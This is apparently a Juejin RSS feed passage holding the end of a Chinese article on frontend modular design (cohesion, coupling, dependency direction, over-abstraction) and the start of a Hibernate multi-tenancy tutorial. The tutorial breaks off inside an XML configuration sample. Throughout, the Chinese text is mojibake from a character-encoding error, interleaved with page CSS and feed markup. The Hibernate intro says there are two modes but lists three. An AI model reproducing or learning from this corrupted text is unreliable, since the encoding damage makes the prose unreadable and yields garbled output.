<p>åœ¨å‰ç«¯å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸çŠ¯çš„é”™è¯¯æ˜¯<strong>æš´éœ²è¿‡å¤š</strong>ã€‚</p>
<ul>
<li><strong>é”™è¯¯ç¤ºèŒƒï¼š</strong> ä¸€ä¸ª <code>DatePicker</code> ç»„ä»¶ï¼Œé€šè¿‡ <code>props</code> æŠŠå†…éƒ¨çš„ <code>calendarInstance</code> æš´éœ²ç»™çˆ¶ç»„ä»¶ï¼Œå…è®¸çˆ¶ç»„ä»¶ç›´æ¥æ“ä½œæ—¥å†å†…éƒ¨çŠ¶æ€ã€‚</li>
<li><strong>æ¶æ„ç¾éš¾ï¼š</strong> è¿™æ„å‘³ç€çˆ¶ç»„ä»¶å’Œå­ç»„ä»¶å½¢æˆäº†<strong>éšæ€§è€¦åˆ</strong>ã€‚ä¸€æ—¦å“ªå¤©ä½ è¦æŠŠåº•å±‚çš„æ—¥å†åº“ä» Moment.js æ¢æˆ Day.jsï¼Œæ•´ä¸ªåº”ç”¨å¯èƒ½éƒ½ä¼šå´©æºƒã€‚</li>
</ul>
<p><strong>çœŸæ­£çš„æ¨¡å—åŒ–æ€ç»´æ˜¯â€œé»‘ç›’æ€ç»´â€ï¼š</strong> å¤–éƒ¨åªç®¡è¾“å…¥ï¼ˆProps/Paramsï¼‰å’Œè¾“å‡ºï¼ˆEvents/Return Valuesï¼‰ï¼Œç»ä¸å…³å¿ƒå†…éƒ¨æ˜¯å¦‚ä½•å®ç°çš„ã€‚</p>
<hr/>
<h2 data-id="heading-3">äºŒã€ æ ¸å¿ƒå¿ƒæ³•ï¼šé«˜å†…èšä¸ä½è€¦åˆçš„è¾©è¯å…³ç³»</h2>
<p>è¿™å…«ä¸ªå­—è¢«è¯´çƒ‚äº†ï¼Œä½†çœŸæ­£èƒ½åšåˆ°çš„å¯¥å¯¥æ— å‡ ã€‚åœ¨å‰ç«¯è¯­å¢ƒä¸‹ï¼Œå®ƒä»¬æœ‰å…·ä½“çš„è½åœ°å«ä¹‰ã€‚</p>
<h3 data-id="heading-4">2.1 ä»€ä¹ˆæ˜¯â€œçœŸå†…èšâ€ï¼Ÿ(True Cohesion)</h3>
<p>å¾ˆå¤šé¡¹ç›®ä¹ æƒ¯æŒ‰â€œæŠ€æœ¯ç±»å‹â€åˆ†ç›®å½•ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-attribute">src</span>/
  â”œâ”€â”€ components/  (æ”¾æ‰€æœ‰ç»„ä»¶)
  â”œâ”€â”€ hooks/       (æ”¾æ‰€æœ‰é’©å­)
  â”œâ”€â”€ utils/       (æ”¾æ‰€æœ‰å·¥å…·)
  â”œâ”€â”€ types/       (æ”¾æ‰€æœ‰ç±»å‹)
</code></pre>
<p>è¿™çœ‹èµ·æ¥å¾ˆæ•´æ´ï¼Œå…¶å®æ˜¯ <strong>â€œå‡å†…èšâ€</strong> ï¼ˆæˆ–è€…å«å¶ç„¶å†…èšï¼‰ã€‚ å½“ä½ éœ€è¦ä¿®æ”¹â€œç™»å½•â€åŠŸèƒ½æ—¶ï¼Œä½ éœ€è¦å» <code>components</code> æ”¹è¡¨å•ï¼Œå» <code>hooks</code> æ”¹é€»è¾‘ï¼Œå» <code>types</code> æ”¹æ¥å£å®šä¹‰ã€‚ä½ çš„ä¿®æ”¹è¡Œä¸ºæ˜¯<strong>è·¨è¶Šç©ºé—´</strong>çš„ã€‚</p>
<p><strong>ç°ä»£å‰ç«¯æ¶æ„æ¨å´‡çš„â€œçœŸå†…èšâ€æ˜¯æŒ‰â€œåŠŸèƒ½ç‰¹æ€§ï¼ˆFeatureï¼‰â€ç»„ç»‡ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-attribute">src</span>/
  â”œâ”€â”€ features/
  â”‚   â”œâ”€â”€ auth/          (ç™»å½•æ¨¡å—ï¼šåŒ…å«è‡ªå·±çš„ components, hooks, types)
  â”‚   â”œâ”€â”€ dashboard/     (å¤§ç›˜æ¨¡å—)
</code></pre>
<p><strong>åˆ¤å®šæ ‡å‡†ï¼š</strong> é‚£äº›<strong>åªæœ‰åœ¨ä¸€èµ·å·¥ä½œæ‰æœ‰æ„ä¹‰</strong>çš„ä»£ç ï¼Œå¿…é¡»ç‰©ç†ä¸Šå°±åœ¨ä¸€èµ·ã€‚<strong>å…±åŒå°é—­åŸåˆ™ï¼ˆCCPï¼‰</strong> å‘Šè¯‰æˆ‘ä»¬ï¼š<strong>å°†é‚£äº›ä¼šå› ä¸ºç›¸åŒç†ç”±è€Œä¿®æ”¹çš„ç±»/æ–‡ä»¶ï¼Œèšåˆåœ¨ä¸€èµ·ã€‚</strong></p>
<h3 data-id="heading-5">2.2 ä»€ä¹ˆæ˜¯â€œä½è€¦åˆâ€ï¼Ÿ(Loose Coupling)</h3>
<p>è€¦åˆä¸å¯é¿å…ï¼Œæ²¡æœ‰è€¦åˆçš„ä»£ç å°±æ˜¯ä¸€å †æ­»ä»£ç ã€‚æ¶æ„å¸ˆè¦åšçš„æ˜¯<strong>æ²»ç†è€¦åˆçš„ç±»å‹</strong>ã€‚</p>
<ul>
<li><strong>å†…å®¹è€¦åˆï¼ˆæœ€å·®ï¼‰ï¼š</strong> ç›´æ¥ä¿®æ”¹å¦ä¸€ä¸ªæ¨¡å—çš„å†…éƒ¨æ•°æ®ã€‚æ¯”å¦‚ç»„ä»¶ A é€šè¿‡ <code>ref</code> å¼ºè¡Œä¿®æ”¹ç»„ä»¶ B çš„ stateã€‚</li>
<li><strong>æ§åˆ¶è€¦åˆï¼ˆè¾ƒå·®ï¼‰ï¼š</strong> ä¼ é€’ flag å‘Šè¯‰å¦ä¸€ä¸ªæ¨¡å—è¯¥æ€ä¹ˆåšã€‚æ¯”å¦‚ <code>Button</code> ç»„ä»¶æ¥æ”¶ä¸€ä¸ª <code>isLoginButton</code> çš„ propï¼Œå¯¼è‡´ Button å†…éƒ¨åŒ…å«äº†ä¸šåŠ¡é€»è¾‘ã€‚</li>
<li><strong>æ•°æ®è€¦åˆï¼ˆæ¨èï¼‰ï¼š</strong> ä»…ä»…ä¼ é€’æ•°æ®ã€‚ç»„ä»¶åªæ¥æ”¶å®ƒéœ€è¦æ¸²æŸ“çš„æ•°æ®ï¼Œä¸å…³å¿ƒæ•°æ®æ¥æºã€‚</li>
<li><strong>äº‹ä»¶/æ¶ˆæ¯è€¦åˆï¼ˆæœ€ä¼˜ï¼‰ï¼š</strong> é€šè¿‡å‘å¸ƒè®¢é˜…æˆ–å›è°ƒå‡½æ•°é€šä¿¡ã€‚æˆ‘ä¸ç›´æ¥è°ƒç”¨ä½ ï¼Œæˆ‘åªå¹¿æ’­â€œæˆ‘åšå®Œäº†â€ï¼Œè°å…³å¿ƒè°å°±æ¥å¤„ç†ã€‚</li>
</ul>
<p><strong>æ¶æ„å¸ˆçš„åˆ€æ³•ï¼š</strong> å½“ä½ å‘ç°ä¸¤ä¸ªæ¨¡å—å¿…é¡»åŒæ—¶ä¿®æ”¹æ‰èƒ½è·‘é€šæ—¶ï¼Œå®ƒä»¬å°±æ˜¯<strong>å¼ºè€¦åˆ</strong>çš„ã€‚è¦ä¹ˆæŠŠå®ƒä»¬åˆå¹¶æˆä¸€ä¸ªæ¨¡å—ï¼Œè¦ä¹ˆå¼•å…¥ä¸€ä¸ªä¸­é—´å±‚ï¼ˆé€‚é…å™¨ï¼‰æ¥è§£è€¦ã€‚</p>
<hr/>
<h2 data-id="heading-6">ä¸‰ã€ è¾¹ç•Œæ€ç»´ï¼šå¦‚ä½•åˆ‡åˆ†æ¨¡å—ï¼Ÿ</h2>
<p>åœ¨æ‹¿åˆ°ä¸€ä¸ªå¤æ‚çš„ä¸šåŠ¡éœ€æ±‚ï¼ˆæ¯”å¦‚ä¸€ä¸ªåœ¨çº¿åä½œæ–‡æ¡£ç¼–è¾‘å™¨ï¼‰æ—¶ï¼Œæ™®é€šå¼€å‘è€…çš„ç¬¬ä¸€ååº”æ˜¯ç”»é¡µé¢ï¼Œè€Œæ¶æ„å¸ˆçš„ç¬¬ä¸€ååº”æ˜¯<strong>åˆ’è¾¹ç•Œ</strong>ã€‚</p>
<h3 data-id="heading-7">3.1 ä¸ç¨³å®šçš„ä¾èµ–è¦éš”ç¦»</h3>
<p><strong>ç¨³å®šä¾èµ–åŸåˆ™ï¼ˆSDPï¼‰ï¼š</strong> ä¾èµ–å…³ç³»åº”è¯¥æŒ‡å‘æ›´ç¨³å®šçš„æ–¹å‘ã€‚</p>
<ul>
<li><strong>UI æ˜¯ä¸ç¨³å®šçš„</strong>ï¼šäº§å“ç»ç†ä»Šå¤©è¦æŠŠæŒ‰é’®æ”¾å·¦è¾¹ï¼Œæ˜å¤©è¦æ”¾å³è¾¹ï¼Œåå¤©è¦æ¢ä¸ªé¢œè‰²ã€‚</li>
<li><strong>ä¸šåŠ¡é€»è¾‘æ˜¯ç›¸å¯¹ç¨³å®šçš„</strong>ï¼šæ–‡æ¡£çš„ä¿å­˜ã€ååŒç®—æ³•ã€æƒé™æ ¡éªŒï¼Œè¿™äº›æ ¸å¿ƒé€»è¾‘ä¸ä¼šè½»æ˜“å˜ã€‚</li>
<li><strong>åŸºç¡€åº“æ˜¯æœ€ç¨³å®šçš„</strong>ï¼šReact æ¡†æ¶ã€Lodash å·¥å…·å‡½æ•°ã€‚</li>
</ul>
<p><strong>æ¨¡å—åŒ–åˆ‡åˆ†ç­–ç•¥ï¼š</strong> ç»ä¸è¦æŠŠæ ¸å¿ƒä¸šåŠ¡é€»è¾‘å†™åœ¨ UI ç»„ä»¶é‡Œï¼ˆVue çš„ <code>script</code> æˆ– React çš„ <code>useEffect</code>ï¼‰ã€‚ <strong>Headlessï¼ˆæ— å¤´åŒ–ï¼‰</strong> æ˜¯å‰ç«¯æ¶æ„çš„å¿…ç„¶è¶‹åŠ¿ã€‚ä½ åº”è¯¥æŠŠé€»è¾‘æŠ½ç¦»æˆçº¯ JS/TS æ¨¡å—ï¼ˆHook æˆ– Classï¼‰ï¼ŒUI åªæ˜¯ä¸€ä¸ªåªæœ‰ <code>render</code> å‡½æ•°çš„ç¬¨è›‹å£³å­ã€‚è¿™æ ·ï¼Œå½“ UI ç¿»å¤©è¦†åœ°å˜åŒ–æ—¶ï¼Œä½ çš„æ ¸å¿ƒé€»è¾‘æ¨¡å—å¯ä»¥çº¹ä¸ä¸åŠ¨ã€‚</p>
<h3 data-id="heading-8">3.2 å¾ªç¯ä¾èµ–æ˜¯æ¶æ„çš„ç™Œç»†èƒ</h3>
<p>å¦‚æœ A æ¨¡å—å¼•ç”¨äº† Bï¼ŒB åˆå¼•ç”¨äº† Aï¼Œè¿™åœ¨æ–‡ä»¶å±‚é¢å¯èƒ½é€šè¿‡ Webpack è§£å†³äº†ï¼Œä½†åœ¨é€»è¾‘å±‚é¢ï¼Œè¿™æ„å‘³ç€ A å’Œ B é”æ­»åœ¨äº†ä¸€èµ·ï¼Œæ— æ³•å•ç‹¬æµ‹è¯•ï¼Œæ— æ³•å•ç‹¬å¤ç”¨ã€‚</p>
<p><strong>å¦‚ä½•æ‰“ç ´å¾ªç¯ï¼Ÿ</strong></p>
<ol>
<li><strong>ä¸‹æ²‰æ³•ï¼š</strong> æ‰¾åˆ° A å’Œ B å…±åŒä¾èµ–çš„éƒ¨åˆ†ï¼ŒæŠ½å–æˆ C æ¨¡å—ï¼ŒA å’Œ B éƒ½ä¾èµ– Cã€‚</li>
<li><strong>åè½¬æ³•ï¼ˆä¾èµ–å€’ç½® DIPï¼‰ï¼š</strong> A ä¸ç›´æ¥ä¾èµ– Bï¼ŒA å®šä¹‰ä¸€ä¸ªæ¥å£ï¼ˆInterfaceï¼‰ï¼ŒB å»å®ç°è¿™ä¸ªæ¥å£ã€‚A åªä¾èµ–æ¥å£ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-9">å››ã€ æ¨¡å—åŒ–çš„ä»£ä»·ï¼šè¿‡åº¦è®¾è®¡çš„é™·é˜±</h2>
<p>æœ€åï¼Œå¿…é¡»ç»™æ¶æ„å¸ˆä»¬æ³¼ä¸€ç›†å†·æ°´ã€‚æ¨¡å—åŒ–æ˜¯æœ‰æˆæœ¬çš„ã€‚</p>
<p><strong>æ¨¡å—åŒ– = å¢åŠ é—´æ¥å±‚ã€‚</strong></p>
<p>å¦‚æœä½ æŠŠä¸€ä¸ªç®€å•çš„â€œHello Worldâ€æ‹†æˆäº† Providerã€Serviceã€Componentã€Type å››ä¸ªæ–‡ä»¶ï¼Œé‚£ä½ ä¸æ˜¯åœ¨åšæ¶æ„ï¼Œä½ æ˜¯åœ¨<strong>åˆ¶é€ å™ªéŸ³</strong>ã€‚</p>
<p><strong>æ¶æ„å¸ˆçš„åˆ¤æ–­åŠ›ä½“ç°åœ¨ï¼š</strong></p>
<ul>
<li><strong>è¯†åˆ«å˜åŒ–ç‚¹ï¼š</strong> åªæœ‰é‚£äº›<strong>æœªæ¥ææœ‰å¯èƒ½å‘ç”Ÿå˜åŒ–</strong>ï¼Œæˆ–è€…<strong>å¤æ‚åº¦æé«˜</strong>çš„åœ°æ–¹ï¼Œæ‰å€¼å¾—è¢«å°è£…æˆç‹¬ç«‹æ¨¡å—ã€‚</li>
<li><strong>é€‚åº¦å†—ä½™ï¼ˆDRY vs WETï¼‰ï¼š</strong> æœ‰æ—¶å€™ï¼Œå¤åˆ¶ç²˜è´´ä»£ç æ¯”é”™è¯¯çš„æŠ½è±¡æ›´å¥½ã€‚å¦‚æœä½ å¼ºè¡ŒæŠŠä¸¤ä¸ªçœ‹ä¼¼ç›¸ä¼¼ä½†ä¸šåŠ¡èƒŒæ™¯å®Œå…¨ä¸åŒçš„é€»è¾‘åˆå¹¶æˆä¸€ä¸ªæ¨¡å—ï¼Œæœªæ¥å½“å®ƒä»¬å‘ä¸åŒæ–¹å‘æ¼”è¿›æ—¶ï¼Œä½ å°†é™·å…¥æ— å°½çš„ <code>if (isModeA) else (isModeB)</code> çš„åœ°ç‹±ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-10">ç»“è¯­ï¼šä»â€œå†™ä»£ç â€åˆ°â€œè®¾è®¡ç³»ç»Ÿâ€</h2>
<p>æ¨¡å—åŒ–ä¸æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œè€Œæ˜¯ä¸€ç§<strong>ä¸–ç•Œè§‚</strong>ã€‚</p>
<p>å½“ä½ å¼€å§‹æ€è€ƒ**â€œå¦‚æœæˆ‘åˆ æ‰è¿™è¡Œä»£ç ï¼Œå½±å“çš„èŒƒå›´æ˜¯å¤šå¤§â€ <strong>ï¼Œæˆ–è€…</strong>â€œå¦‚æœæˆ‘æŠŠè¿™ä¸ªæ–‡ä»¶å¤¹ç§»èµ°ï¼Œå…¶ä»–éƒ¨åˆ†è¿˜èƒ½ä¸èƒ½è·‘â€**çš„æ—¶å€™ï¼Œä½ å°±å·²ç»è·¨è¶Šäº†â€œæ–‡ä»¶æ‹†åˆ†â€çš„è¾¹ç•Œï¼Œå¼€å§‹ç”¨æ¶æ„å¸ˆçš„çœ¼å…‰å®¡è§†ä½ çš„ç³»ç»Ÿäº†ã€‚</p>
<p>è¿™åªæ˜¯æ€æƒ³çš„å¼€ç¯‡ã€‚æœ‰äº†è¿™ä¸ªæ€ç»´åŸºçŸ³ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†æ·±å…¥éª¨æ¶ï¼Œæ¢è®¨å¦‚ä½•åœ¨å…·ä½“çš„ UI å±‚é¢å®ç°<strong>æè‡´çš„é€»è¾‘ä¸è§†å›¾åˆ†ç¦»</strong>ã€‚</p>
<blockquote>
<p><strong>Next Step:</strong> æ€æƒ³å·²ç»å»ºç«‹ï¼Œä¸‹ä¸€èŠ‚æˆ‘ä»¬å°†è¿›å…¥å®æˆ˜æ·±æ°´åŒºã€‚å¦‚ä½•è®¾è®¡ä¸€ä¸ªæ—¢èƒ½å¤ç”¨ï¼Œåˆèƒ½çµæ´»å®šåˆ¶ UI çš„ç»„ä»¶ï¼Ÿ è¯·çœ‹**ã€Šç¬¬äºŒç¯‡ï¼šéª¨æ¶ï¼ˆä¸Šï¼‰â€”â€”ç»„ä»¶åŒ–æ·±åº¦è®¾è®¡ï¼šé€»è¾‘ä¸è§†å›¾çš„æè‡´åˆ†ç¦»ï¼ˆHeadless UIï¼‰ã€‹**ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ55ï¼‰Hibernateçš„å¤šç§Ÿæˆ·æ”¯æŒå¦‚ä½•å®ç°ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7597635202324807732</link>    <guid>https://juejin.cn/post/7597635202324807732</guid>    <pubDate>2026-01-21T11:54:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597635202324807732" data-draft-id="7597623654056263695" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ55ï¼‰Hibernateçš„å¤šç§Ÿæˆ·æ”¯æŒå¦‚ä½•å®ç°ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-21T11:54:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ55ï¼‰Hibernateçš„å¤šç§Ÿæˆ·æ”¯æŒå¦‚ä½•å®ç°ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:54:41.000Z" title="Wed Jan 21 2026 11:54:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ç°ä»£ä¼ä¸šåº”ç”¨ä¸­ï¼Œå¤šç§Ÿæˆ·æ”¯æŒæ˜¯ä¸€ä¸ªé‡è¦çš„éœ€æ±‚ã€‚Hibernateæä¾›äº†å¯¹å¤šç§Ÿæˆ·æ¶æ„çš„æ”¯æŒï¼Œå¯ä»¥ä½¿ä¸€ä¸ªåº”ç”¨ç¨‹åºæ”¯æŒå¤šä¸ªç‹¬ç«‹çš„å®¢æˆ·ï¼ˆç§Ÿæˆ·ï¼‰å…±äº«ä¸€ä¸ªæ•°æ®æºã€‚Hibernateçš„å¤šç§Ÿæˆ·æ”¯æŒä¸»è¦æœ‰ä¸¤ç§æ¨¡å¼ï¼š</p>
<ol>
<li><strong>Schema-based å¤šç§Ÿæˆ·</strong>ï¼šæ¯ä¸ªç§Ÿæˆ·æœ‰ç‹¬ç«‹çš„æ•°æ®åº“æ¨¡å¼ï¼ˆschemaï¼‰ã€‚</li>
<li><strong>Database-based å¤šç§Ÿæˆ·</strong>ï¼šæ¯ä¸ªç§Ÿæˆ·æœ‰ç‹¬ç«‹çš„æ•°æ®åº“å®ä¾‹ã€‚</li>
<li><strong>Discriminator-based å¤šç§Ÿæˆ·</strong>ï¼šå•ä¸€æ•°æ®åº“å’Œå•ä¸€è¡¨ç»“æ„ï¼Œé€šè¿‡ä¸€ä¸ªç§Ÿæˆ·æ ‡è¯†ç¬¦æ¥åŒºåˆ†ä¸åŒç§Ÿæˆ·çš„æ•°æ®ã€‚</li>
</ol>
<p>ä¸‹é¢å°†è¯¦ç»†ä»‹ç»å¦‚ä½•å®ç°è¿™ä¸‰ç§å¤šç§Ÿæˆ·æ”¯æŒï¼Œç»“åˆä»£ç ç¤ºä¾‹è¯´æ˜ã€‚</p>
<h3 data-id="heading-0">1. Schema-based å¤šç§Ÿæˆ·</h3>
<p>åœ¨è¿™ç§æ¨¡å¼ä¸­ï¼Œæ¯ä¸ªç§Ÿæˆ·æœ‰ç‹¬ç«‹çš„æ•°æ®åº“æ¨¡å¼ï¼ˆschemaï¼‰ï¼Œä½†å…±äº«åŒä¸€ä¸ªæ•°æ®åº“å®ä¾‹ã€‚</p>
<h4 data-id="heading-1">é…ç½®Hibernate</h4>
<p>åœ¨<code>hibernate.cfg.xml</code>ä¸­é…ç½®Hibernateï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- å¤šç§Ÿæˆ·é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.multiTenancy"</span>&gt;</span>SCHEMA<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.tenant_identifier_resolver"</span>&gt;</span>com.example.TenantIdentifierResolverImpl<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
